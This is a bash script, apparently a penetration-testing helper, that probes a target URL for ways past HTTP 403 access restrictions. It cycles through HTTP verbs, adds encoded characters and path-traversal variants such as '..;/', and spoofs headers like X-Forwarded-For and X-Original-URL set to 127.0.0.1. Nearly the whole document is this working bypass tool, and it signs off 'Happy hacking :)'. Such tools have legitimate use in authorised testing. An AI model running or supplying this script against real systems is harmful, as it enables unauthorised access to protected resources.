#!/bin/bash

# colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;36m'
NC='\033[0m'

MAIN_URL=$1
PATH=$2
FULL_URL=$(echo "$MAIN_URL$PATH")
HOST=$(echo "$MAIN_URL" | /usr/bin/sed -E "s/https?\:\/\///g")

USER_AGENT='User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0'
HTTP_VERBS=$(echo 'GET POST DELETE CONNECT TRACE PURGE OPTIONS' | /usr/bin/tr ' ' '\n')
ENCODED_CHARS=$(echo "%20 %09" | /usr/bin/sed -E "s/https?\:\/\///g")
X_URL_HEADERS=$(echo "X-Real-IP X-Forwarded-For X-Originating-IP X-Remote-IP X-Client-IP X-Original-URL X-Override-URL X-Rewrite-URL X-Custom-IP-Authorization X-Host X-Forwarded-Host X-Remote-Addr" | /usr/bin/sed -E "s/https?\:\/\///g")

echo ""
echo -e "${GREEN}Target${NC}: $FULL_URL"
echo -e "Checking for ${PURPLE}403 bypasses${NC}. This might take a moment..." 
echo ""

echo -e "${YELLOW}###${NC} HTTP Verbs"
for HTTP_VERB in $HTTP_VERBS; 
do
    echo -e -n "${NC}${YELLOW}[+]${NC} [${HTTP_VERB}]: ${BLUE}"
    if [[ "$HTTP_VERB" = "POST" ]]; then
        /usr/bin/curl -H "Content-Length:0" -s -H $USER_AGENT -s -i $MAIN_URL -k -H "Host: $HOST" -X $HTTP_VERB | /usr/bin/head -1 | /usr/bin/cut -d " " -f2
    else
        /usr/bin/curl -s -H $USER_AGENT -s -i $MAIN_URL -k -H "Host: $HOST" -X $HTTP_VERB | /usr/bin/head -1
    fi
done

echo ""
echo -e "${YELLOW}###${NC} Encoded chars"
for ENCODED_CHAR in $ENCODED_CHARS; 
do
    echo -e -n "${NC}${YELLOW}[+]${NC} [${ENCODED_CHAR}]: ${BLUE}"
    /usr/bin/curl -s -H $USER_AGENT -i $MAIN_URL$PATH$ENCODED_CHAR -k -H "Host: $HOST" | /usr/bin/head -1
done

echo ""
echo -e "${YELLOW}###${NC} X-Headers"
for X_URL_HEADER in $X_URL_HEADERS; do
    echo -e -n "${NC}${YELLOW}[+]${NC} [${X_URL_HEADER}]: ${BLUE}"
    /usr/bin/curl -s -H $USER_AGENT -k -s -i "$MAIN_URL$PATH" -H "Host: $HOST" -H "$X_URL_HEADER: 127.0.0.1" | /usr/bin/head -1
done

echo ""
echo -e "${YELLOW}###${NC} Path traversal"
new_path=$(echo -n $PATH | /usr/bin/sed "s/\//\/\//g")
echo -e -n "${NC}${YELLOW}[+]${NC} [${new_path}] ${BLUE}"
/usr/bin/curl -s -H $USER_AGENT -k -s -i "$MAIN_URL$new_path" -H "Host: $HOST" | /usr/bin/head -1

echo -e -n "${NC}${YELLOW}[+]${NC} [..;/]: ${BLUE}"
/usr/bin/curl -s -H $USER_AGENT -k -s -i "$MAIN_URL$PATH/..;/" -H "Host: $HOST" | /usr/bin/head -1

echo -e -n "${NC}${YELLOW}[+]${NC} [Referer]: ${BLUE}"
/usr/bin/curl -s -H $USER_AGENT -k -s -i "$MAIN_URL$PATH" -H "Host: $HOST" -H "Referer: $MAIN_URL$PATH"| /usr/bin/head -1

echo ""
echo "Happy hacking :)"
